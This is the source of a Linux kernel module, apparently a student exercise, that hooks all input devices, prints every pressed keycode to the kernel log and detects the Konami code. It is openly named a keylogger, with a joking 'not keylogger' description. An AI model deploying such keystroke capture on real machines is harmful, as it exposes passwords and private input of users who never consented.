#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("281443-279460");
MODULE_DESCRIPTION("Is definitly not keylogger");
MODULE_VERSION("1.0");

static struct input_handler keylogger_handler;

// static char keycode_to_char(unsigned int code) {
//     if (code >= KEY_1 && code <= KEY_9) {
//         return '0' + (code - KEY_1);  
//     }
//     if (code == KEY_0) {
//         return '0';
//     }
//     if (code >= KEY_A && code <= KEY_Z) {
//         return 'A' + (code - KEY_A); 
//     }
//     if (code == KEY_SPACE) {
//         return ' '; 
//     }
//     if (code == KEY_ENTER) {
//         return '\n';  
//     }
    
//     return '\0';  
// }



// static const unsigned int konami_code[] = {103, 103, 108, 108, 105, 106, 105, 106, 48, 30};
static const unsigned int konami_code[] = {
    KEY_UP, KEY_UP, KEY_DOWN, KEY_DOWN,
    KEY_LEFT, KEY_RIGHT, KEY_LEFT, KEY_RIGHT,
    KEY_B, KEY_A
};
static int konami_index = 0;

static void play_beep(void) {
    printk(KERN_INFO "konami code activated");
}


static void keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
    if (type == EV_KEY && value == 1) { 
        printk(KERN_INFO "Key pressed: %u\n", code);
        if (code == konami_code[konami_index]) {
            konami_index++;
            if (konami_index == ARRAY_SIZE(konami_code)) {
                play_beep();
                konami_index = 0;
            }
        } else {
            konami_index = 0;
        }
    }

}



static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
    struct input_handle *handle;

    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "keylogger";

    input_register_handle(handle);
    input_open_device(handle);

    return 0;
}

static void keylogger_disconnect(struct input_handle *handle) {
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}


static const struct input_device_id keylogger_ids[] = {
    { .driver_info = 1 },
    { },
};

MODULE_DEVICE_TABLE(input, keylogger_ids);

static struct input_handler keylogger_handler = {
    .event = keylogger_event,
    .connect = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name = "keylogger",
    .id_table = keylogger_ids,
};


static int __init keylogger_init(void) {
    return input_register_handler(&keylogger_handler);
}

static void __exit keylogger_exit(void) {
    input_unregister_handler(&keylogger_handler);
}

module_init(keylogger_init);
module_exit(keylogger_exit);


